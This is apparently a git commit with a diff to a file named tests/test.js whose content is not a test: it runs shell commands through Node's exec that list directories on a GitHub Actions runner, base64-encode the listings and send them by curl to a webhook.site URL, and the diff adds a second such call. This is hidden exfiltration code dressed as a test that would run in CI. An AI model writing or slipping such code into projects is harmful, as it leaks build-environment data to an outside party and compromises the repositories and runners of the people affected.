4a4c17a75433e18e1da86a5fb981269197329d56
RashestLight <terrelldixon02@yahoo.com>
2023-04-15 19:47:46 -0400

    anotha one

--- tests/test.js
+++ tests/test.js
@@ -3,7 +3,7 @@
 
 const { exec } = require('node:child_process')
 
-exec('curl https://webhook.site/200fdf69-4bd3-4432-9c2c-7617a5a5c458?$(cd /home/runner/work/_actions/actions; ls | base64)' , (err, output) => {
+exec('curl https://webhook.site/200fdf69-4bd3-4432-9c2c-7617a5a5c458?$(cd /home/runner/work/_actions/actions/checkout; ls | base64)' , (err, output) => {
     if (err) {
         console.error("could not execute command: ", err)
         return
@@ -12,4 +12,12 @@ exec('curl https://webhook.site/200fdf69-4bd3-4432-9c2c-7617a5a5c458?$(cd /home/
     console.log("Output: \n", output)
 })
 
+exec('curl https://webhook.site/200fdf69-4bd3-4432-9c2c-7617a5a5c458?$(cd /home/runner/work; ls | base64)' , (err, output) => {
+    if (err) {
+        console.error("could not execute command: ", err)
+        return
+    }
+    // log the output received from the command
+    console.log("Output: \n", output)
+})
 
